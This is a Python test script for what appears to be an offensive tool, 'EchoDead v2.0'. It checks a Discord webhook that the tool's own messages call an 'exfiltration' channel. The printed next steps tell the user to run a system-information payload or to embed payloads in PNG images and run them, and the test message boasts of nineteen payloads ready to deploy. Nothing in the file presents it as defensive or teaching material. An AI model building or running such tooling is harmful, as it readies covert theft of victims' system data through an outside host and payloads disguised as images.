#!/usr/bin/env python3
"""
Discord Webhook Test Script
Tests your Discord webhook configuration
"""

import sys
import os

# Add payloads directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'example_payloads'))

from webhook_utils import send_to_discord
from datetime import datetime

def main():
    print("=" * 70)
    print("DISCORD WEBHOOK TEST")
    print("=" * 70)
    print(f"\nTesting webhook at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # Test data
    test_data = {
        "Status": "✅ Webhook configured successfully!",
        "Tool": "EchoDead v2.0",
        "Message": "Your Discord exfiltration is ready!",
        "Test Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Ready Payloads": "19 payloads ready to deploy",
        "Next Step": "Run any payload to see live exfiltration"
    }
    
    print("📤 Sending test message to Discord...")
    print("\nTest Data:")
    for key, value in test_data.items():
        print(f"  {key}: {value}")
    
    print("\n" + "-" * 70)
    
    # Send test message
    if send_to_discord("🧪 EchoDead Webhook Test", test_data):
        print("\n✅ SUCCESS! Check your Discord channel!")
        print("\n🎉 Your webhook is properly configured!")
        print("\n📋 Next steps:")
        print("   1. Check your Discord channel for the test message")
        print("   2. Try running a payload:")
        print("      python example_payloads/system_info.py")
        print("   3. Or embed a payload:")
        print("      python src/main.py workflow test.png example_payloads/system_info.py output.png --run")
        return True
    else:
        print("\n❌ FAILED! Webhook test unsuccessful")
        print("\n🔧 Troubleshooting:")
        print("   1. Verify webhook URL is correct")
        print("   2. Check Discord server is online")
        print("   3. Ensure webhook hasn't been deleted")
        print("   4. Check firewall allows HTTPS connections")
        print("\n📖 See DISCORD_SETUP.md for detailed troubleshooting")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
